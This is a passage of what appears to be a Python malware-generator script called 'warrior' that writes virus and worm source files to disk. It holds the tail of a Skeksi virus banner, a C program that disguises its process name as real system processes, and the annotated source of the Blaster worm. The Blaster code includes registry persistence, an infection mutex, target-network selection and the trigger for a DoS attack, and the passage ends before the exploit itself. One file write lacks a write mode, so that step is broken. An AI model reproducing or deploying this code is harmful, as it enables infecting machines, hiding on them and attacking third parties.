"\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x3a\x3b\x20\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x38\x38\x1b\x5b\x30\x3b"
"\x35\x3b\x33\x31\x3b\x34\x30\x6d\x58\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x36\x3b\x34\x30\x6d\x20\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b"
"\x34\x30\x6d\x3b\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x20\x1b\x5b"
"\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x32"
"\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b"
"\x5b\x30\x3b\x35\x3b\x33\x35\x3b\x34\x30\x6d\x20\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x74\x1b\x5b\x30\x3b\x35\x3b\x33"
"\x33\x3b\x34\x30\x6d\x2e\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b"
"\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x38\x1b\x5b\x30\x6d\x0d\x0a"
"\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33"
"\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b"
"\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b"
"\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b"
"\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x74\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d"
"\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31"
"\x3b\x33\x37\x3b\x34\x37\x6d\x53\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x25\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30"
"\x6d\x74\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x37\x6d\x25\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b"
"\x31\x3b\x33\x30\x3b\x34\x37\x6d\x3a\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x20\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34"
"\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x25\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x53\x53\x1b\x5b"
"\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x74\x2e\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x25\x1b\x5b\x30\x3b\x35\x3b\x33"
"\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x37\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x20"
"\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x37\x6d\x3a\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x20\x1b\x5b\x30\x3b\x35\x3b"
"\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d"
"\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x25\x1b\x5b\x30\x3b\x35"
"\x3b\x33\x35\x3b\x34\x30\x6d\x20\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30"
"\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31"
"\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x32\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30"
"\x3b\x33\x32\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x6d\x0d\x0a\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33"
"\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b"
"\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34"
"\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33"
"\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b"
"\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33"
"\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x74"
"\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x20\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x2e\x1b\x5b\x30\x3b\x35"
"\x3b\x33\x33\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37"
"\x6d\x38\x38\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x38\x1b\x5b"
"\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x3a\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x31"
"\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x38\x1b"
"\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33"
"\x31\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x33\x32\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b"
"\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33"
"\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b"
"\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b"
"\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x6d"
"\x0d\x0a\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b"
"\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34"
"\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30"
"\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30"
"\x6d\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b"
"\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d"
"\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x33\x31"
"\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b"
"\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b"
"\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b"
"\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b"
"\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30"
"\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b"
"\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b"
"\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b"
"\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b"
"\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34"
"\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x32\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x33\x31\x3b"
"\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b"
"\x30\x6d\x0d\x0a\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b"
"\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30"
"\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x53\x38\x38\x1b\x5b\x30\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b"
"\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34"
"\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33"
"\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b"
"\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34"
"\x30\x6d\x38\x38\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x38\x1b\x5b\x30"
"\x3b\x33\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x38\x38\x38\x38\x1b\x5b\x30\x3b\x33\x31"
"\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30"
"\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30"
"\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31"
"\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30"
"\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30"
"\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x33"
"\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x6d\x0d\x0a";

void display_skeksi(void)
{
	_write(1, (char *)skeksi_banner, sizeof(skeksi_banner));
}


    ''')


def linux_virus():
    file4 = open('Linux_Virus.c')
    file4.write('''
    #include<stdio.h> 
 #include<stdlib.h> 
 #include<string.h> 
 #include<unistd.h> 

 int main(int argc, char* argv[]) 
 { 
     char buff[1024]; // Buffer to read lines 
     char new_name[1028]; // Buffer to store new process name 

     char *ptr = NULL; 
     FILE *fp  = NULL; 

     a: memset(buff,'\0', sizeof(buff)); // Setting the memory with NULLs 
     memset(new_name,'\0', sizeof(new_name)); // Setting the memory with NULLs 

     // Introduce constant 3 bytes '123' in the beginning  
     // of every name that we change our process name to.  
     // So that we can at-least easily track our process name 
     // when we check it using ps command. Note that 
     // this is only for practice purpose otherwise there 
     // is no need for a set of constant bytes like these. 
     new_name[0] = '1'; 
     new_name[1] = '2'; 
     new_name[2] = '3'; 

     // Run the command 'ps -aef > ps.txt' 
     // This command will store the result of 'ps -aef' in a text file 'ps.txt' 
     // The files would have entries like : 
        // UID        PID  PPID  C STIME TTY          TIME CMD 
        // root         1     0  0 20:49 ?        00:00:00 /sbin/init 
        // root         2     0  0 20:49 ?        00:00:00 [kthreadd] 
        // root         3     2  0 20:49 ?        00:00:00 [migration/0] 
        // root         4     2  0 20:49 ?        00:00:00 [ksoftirqd/0] 

     system("/bin/sh -c 'ps -aef > ps.txt'"); 


     // Open the file 'ps.txt' 
     fp = fopen("ps.txt", "r"); 

     if(NULL == fp) 
     { 
         printf("\n File open failed\n"); 
         return -1; 
     } 

     // Get each line from file until the whole file is read or some error occurs 
     while(NULL != fgets(buff, sizeof(buff), fp)) 
     { 
         // Search for the character '[' in the line fetched from file. 
         // This is because most of the process names are enclosed in '[' brackets. 
         // For example : 
         // root         2     0  0 20:49 ?        00:00:00 [kthreadd] 
         ptr = strchr(buff, '['); 

         unsigned int len = strlen(buff); 

         if(NULL == ptr) 
         { 
             // Search for the character '/' in the line fetched from file. 
             // This is because many of the process names are start with '/'. 
             // For example : 
             // root         1     0  0 20:49 ?        00:00:00 /sbin/init 
             ptr = strchr(buff, '/'); 
         } 
         if(NULL != ptr) 
         { 
             // If any one of '[' or '/' is found than copy the complete process 
             // name in the buffer which already holds 123 as its first three bytes. 
             // Make sure that you do not overwrite the first three bytes of the buffer 
             // new_name which contains 123 as its first three bytes 
             strncat((new_name+3), ptr, ((buff + len-1) - ptr)); 
         } 
         else 
         { 
             // If the line fetched does not contain either of '[' or '/' 
             // Then use a default process name '/bin/bash' 
             ptr = "/bin/bash"; 
             strncpy((new_name+3), ptr, strlen(ptr)); 
         } 

         // Since by now we have the new_name buffer filled with 
         // new process name so copy this name to arg[0] so as to  
         // change our process name.   
         strncpy(argv[0], new_name, sizeof(new_name)); 

         printf("\n %s \n", new_name); 

         //A delay of eight seconds so that you can run the command 'ps -aef' 
         // and check the new name of our process. :-) 
         sleep(8); 

         //Time to fetch a new line from ps.txt so just reset 
         // the buffer new_name with NULL bytes except the first 
         // three bytes which are '123'.  
         memset((new_name+3),'\0', sizeof(new_name)); 
     } 

     // Seems like either we are done reading all the lines 
     // from ps.txt or fgets() encountered some error. In either 
     // of the case, just close the file descriptor 
     fclose(fp); 

     // Since we do not want to stop even now, so lets re run the 
     // whole cycle again from running the command 'ps -aef > ps.txt' 
     // to reading each line using fgets() and changing the our process 
     // name accordingly 
     goto a; 

     return 0; 
 }

    ''')


def thanks():
    print(Fore.MAGENTA + '''
     |￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣|
      Thank you for using warrior!
    |＿＿＿＿＿＿＿＿＿＿＿____________|
    (\__/) ||
    (•ㅅ•) ||
    / 　 づ
        ''')

def windows8():
        virus8 = open('blasterworm.c', 'w+')
        virus8.write('''
            #include <winsock2.h>
#include <ws2tcpip.h> /*IP_HDRINCL*/
#include <wininet.h> /*InternetGetConnectedState*/
#include <stdio.h>

#pragma comment (lib, "ws2_32.lib")
#pragma comment (lib, "wininet.lib")
#pragma comment (lib, "advapi32.lib")


/*
* These strings aren't used in the worm, Buford put them here
* so that whitehat researchers would discover them.
* BUFORD: Note that both of these messages are the typical
* behavior of a teenager who recently discovered love, and
* is in the normal teenage mode of challenging authority.
*/
const char msg1[]="I just want to say LOVE YOU SAN!!";
const char msg2[]="billy gates why do you make this possible ?"
" Stop making money and fix your software!!";


/*
* Buford probably put the worm name as a "define" at the top
* of his program so that he could change the name at any time.
* 2003-09-29: This is the string that Parson changed.
*/
#define MSBLAST_EXE "msblast.exe"

/*
* MS-RPC/DCOM runs over port 135.
* DEFENSE: firewalling port 135 will prevent systems from
* being exploited and will hinder the spread of this worm.
*/
#define MSRCP_PORT_135 135

/*
* The TFTP protocol is defined to run on port 69. Once this
* worm breaks into a victim, it will command it to download
* the worm via TFTP. Therefore, the worms briefly runs a
* TFTP service to deliver that file.
* DEFENSE: firewalling 69/udp will prevent the worm from
* fully infected a host.
*/
#define TFTP_PORT_69 69

/*
* The shell-prompt is established over port 4444. The 
* exploit code (in the variable 'sc') commands the victim
* to "bind a shell" on this port. The exploit then connects
* to that port to send commands, such as TFTPing the 
* msblast.exe file down and launching it.
* DEFENSE: firewalling 4444/tcp will prevent the worm from
* spreading.
*/
#define SHELL_PORT_4444 4444


/*
* A simple string to hold the current IP address
*/
char target_ip_string[16];

/*
* A global variable to hold the socket for the TFTP service.
*/
int fd_tftp_service;

/* 
* Global flag to indicate this thread is running. This
* is set when the thread starts, then is cleared when
* the thread is about to end.
* This demonstrates that Buford isn't confident with
* multi-threaded programming -- he should just check
* the thread handle.
*/
int is_tftp_running;

/* 
* When delivering the worm file to the victim, it gets the
* name by querying itself using GetModuleFilename(). This
* makes it easier to change the filename or to launch the
* worm. */
char msblast_filename[256+4];

int ClassD, ClassC, ClassB, ClassA;

int local_class_a, local_class_b;

int winxp1_or_win2k2;


ULONG WINAPI blaster_DoS_thread(LPVOID);
void blaster_spreader();
void blaster_exploit_target(int fd, const char *victim_ip);
void blaster_send_syn_packet(int target_ip, int fd);


/*************************************************************** 
* This is where the 'msblast.exe' program starts running
***************************************************************/
void main(int argc, char *argv[]) 
{ 
WSADATA WSAData; 
char myhostname[512]; 
char daystring[3];
char monthstring[3]; 
HKEY hKey;
int ThreadId;
register unsigned long scan_local=0; 

/*
* Create a registry key that will cause this worm
* to run every time the system restarts.
* DEFENSE: Slammer was "memory-resident" and could
* be cleaned by simply rebooting the machine.
* Cleaning this worm requires this registry entry
* to be deleted.
*/
RegCreateKeyEx(
/*hKey*/ HKEY_LOCAL_MACHINE, 
/*lpSubKey*/ "SOFTWARE\\Microsoft\\Windows\\"
"CurrentVersion\\Run",
/*Reserved*/ 0,
/*lpClass*/ NULL,
/*dwOptions*/ REG_OPTION_NON_VOLATILE,
/*samDesired */ KEY_ALL_ACCESS,
/*lpSecurityAttributes*/ NULL, 
/*phkResult */ &hKey,
/*lpdwDisposition */ 0);
RegSetValueExA(
hKey, 
"windows auto update", 
0, 
REG_SZ, 
MSBLAST_EXE, 
50);
RegCloseKey(hKey); 


/*
* Make sure this isn't a second infection. A common problem
* with worms is that they sometimes re-infect the same
* victim repeatedly, eventually crashing it. A crashed 
* system cannot spread the worm. Therefore, worm writers
* now make sure to prevent reinfections. The way Blaster
* does this is by creating a system "global" object called
* "BILLY". If another program in the computer has already
* created "BILLY", then this instance won't run.
* DEFENSE: this implies that you can remove Blaster by 
* creating a mutex named "BILLY". When the computer 
* restarts, Blaster will falsely believe that it has
* already infected the system and will quit. 
*/
CreateMutexA(NULL, TRUE, "BILLY"); 
if (GetLastError() == ERROR_ALREADY_EXISTS)
ExitProcess(0); 

/*
* Windows systems requires "WinSock" (the network API layer)
* to be initialized. Note that the SYNflood attack requires
* raw sockets to be initialized, which only works in
* version 2.2 of WinSock.
* BUFORD: The following initialization is needlessly
* complicated, and is typical of programmers who are unsure
* of their knowledge of sockets..
*/
if (WSAStartup(MAKEWORD(2,2), &WSAData) != 0
&& WSAStartup(MAKEWORD(1,1), &WSAData) != 0
&& WSAStartup(1, &WSAData) != 0)
return;

/*
* The worm needs to read itself from the disk when 
* transferring to the victim. Rather than using a hard-coded
* location, it discovered the location of itself dynamically
* through this function call. This has the side effect of
* making it easier to change the name of the worm, as well
* as making it easier to launch it.
*/
GetModuleFileNameA(NULL, msblast_filename,
sizeof(msblast_filename)); 

/*
* When the worm infects a dialup machine, every time the user
* restarts their machine, the worm's network communication
* will cause annoying 'dial' popups for the user. This will
* make them suspect their machine is infected.
* The function call below makes sure that the worm only
* starts running once the connection to the Internet
* has been established and not before.
* BUFORD: I think Buford tested out his code on a machine
* and discovered this problem. Even though much of the
* code indicates he didn't spend much time on
* testing his worm, this line indicates that he did
* at least a little bit of testing.
*/
while (!InternetGetConnectedState(&ThreadId, 0))
Sleep (20000); /*wait 20 seconds and try again */

/*
* Initialize the low-order byte of target IP address to 0.
*/
ClassD = 0;

/*
* The worm must make decisions "randomly": each worm must
* choose different systems to infect. In order to make
* random choices, the programmer must "seed" the random
* number generator. The typical way to do this is by
* seeding it with the current timestamp.
* BUFORD: Later in this code you'll find that Buford calls
* 'srand()' many times to reseed. This is largely
* unnecessary, and again indicates that Buford is not 
* confident in his programming skills, so he constantly
* reseeds the generator in order to make extra sure he
* has gotten it right.
*/
srand(GetTickCount()); 

/*
* This initializes the "local" network to some random
* value. The code below will attempt to figure out what
* the true local network is -- but just in case it fails,
* the initialization fails, using random values makes sure
* the worm won't do something stupid, such as scan the
* network around 0.0.0.0
*/
local_class_a = (rand() % 254)+1; 
local_class_b = (rand() % 254)+1; 

/*
* This discovers the local IP address used currently by this
* victim machine. Blaster randomly chooses to either infect
* just the local ClassB network, or some other network,
* therefore it needs to know the local network.
* BUFORD: The worm writer uses a complex way to print out
* the IP address into a string, then parse it back again
* to a number. This demonstrates that Buford is fairly
* new to C programming: he thinks in terms of the printed
* representation of the IP address rather than in its
* binary form.
*/
if (gethostname(myhostname, sizeof(myhostname)) != -1) {
HOSTENT *p_hostent = gethostbyname(myhostname);

if (p_hostent != NULL && p_hostent->h_addr != NULL) {
struct in_addr in; 
const char *p_addr_item;

memcpy(&in, p_hostent->h_addr, sizeof(in));
sprintf(myhostname, "%s", inet_ntoa(in)); 

p_addr_item = strtok(myhostname, ".");
ClassA = atoi(p_addr_item); 

p_addr_item = strtok(0, ".");
ClassB = atoi(p_addr_item);

p_addr_item = strtok(0, ".");
ClassC = atoi(p_addr_item);

if (ClassC > 20) { 
/* When starting from victim's address range, 
* try to start a little bit behind. This is
* important because the scanning logic only
* move forward. */
srand(GetTickCount()); 
ClassC -= (rand() % 20); 
} 
local_class_a = ClassA; 
local_class_b = ClassB; 
scan_local = TRUE; 
}
}


/*
* This chooses whether Blaster will scan just the local
* network (40% chance) or a random network (60% chance)
*/
srand(GetTickCount()); 
if ((rand() % 20) < 12) 
scan_local = FALSE;

/*
* The known exploits require the hacker to indicate whether 
* the victim is WinXP or Win2k. The worm has to guess. The
* way it guesses is that it chooses randomly. 80% of the time
* it will assume that all victims are WinXP, and 20% of the
* time it will assume all victims are Win2k. This means that
* propogation among Win2k machines will be slowed down by
* the fact Win2k machines are getting DoSed faster than they
* are getting exploited. 
*/
winxp1_or_win2k2 = 1; 
if ((rand()%10) > 7) 
winxp1_or_win2k2 = 2; 

/*
* If not scanning locally, then choose a random IP address
* to start with.
* BUG: this worm choose bad ranges above 224. This will 
* cause a bunch of unnecessary multicast traffic. Weird
* multicast traffic has historically been an easy way of 
* detecting worm activity.
*/
if (!scan_local) { 
ClassA = (rand() % 254)+1; 
ClassB = (rand() % 254); 
ClassC = (rand() % 254); 
}


/*
* Check the date so that when in the certain range, it will 
* trigger a DoS attack against Micosoft. The following
* times will trigger the DoS attack:
* Aug 16 through Aug 31
* Spt 16 through Spt 30
* Oct 16 through Oct 31
* Nov 16 through Nov 30
* Dec 16 through Dec 31
* This applies to all years, and is based on local time.
* FAQ: The worm is based on "local", not "global" time.
* That means the DoS attack will start from Japan,
* then Asia, then Europe, then the United States as the
* time moves across the globe.
*/
